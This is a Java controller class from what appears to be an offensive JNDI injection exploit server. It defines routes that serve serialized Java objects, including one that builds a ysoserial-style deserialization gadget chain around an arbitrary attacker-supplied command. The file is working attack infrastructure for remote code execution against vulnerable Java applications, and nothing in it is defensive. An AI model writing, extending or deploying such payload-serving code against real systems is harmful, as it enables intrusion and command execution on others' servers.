package cn.butler.jndi.controller;

import cn.butler.jndi.annotation.JNDIController;
import cn.butler.jndi.annotation.JNDIMapping;
import cn.butler.yso.Serializer;
import cn.butler.payloads.ObjectPayload;

import java.util.*;

@JNDIController
@JNDIMapping("/Deserialize")
public class DeserializeController implements Controller {
    public Object process(byte[] data) {
        return data;
    }

    @JNDIMapping("/Custom/{data}")
    public byte[] deserialize(String data) {
        System.out.println("[Deserialize] Custom serialized data");
        return Base64.getUrlDecoder().decode(data);
    }

    @JNDIMapping("/{gadget}/{cmd}")
    public byte[] GadgetGenByYsoAttack(String gadget,String cmd) throws Exception {
        System.out.println(String.format("[Deserialize] [%s] [Command] Cmd: %s", gadget, cmd));

        Object object = ObjectPayload.Utils.makePayloadObject("YsoAttack",gadget, cmd);
        byte[] data = Serializer.serialize(object);
        return data;
    }
}
